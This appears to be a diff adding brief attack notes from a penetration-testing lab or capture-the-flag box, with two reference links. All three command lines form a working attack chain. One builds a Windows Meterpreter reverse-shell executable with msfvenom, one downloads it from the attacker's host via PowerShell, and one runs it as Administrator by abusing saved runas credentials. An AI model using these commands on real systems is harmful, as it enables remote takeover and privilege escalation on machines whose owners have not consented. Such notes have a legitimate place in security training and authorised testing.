@@ -1,0 +1,7 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.13.156 LPORT=4444 -f exe > shell.exe
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.13.156/shell.exe','C:\Users\security\shell.exe')
+runas /savecred /user:Administrator shell.exe
+
+reference:
+https://blog.ropnop.com/transferring-files-from-kali-to-windows/
+https://ss64.com/nt/runas.html
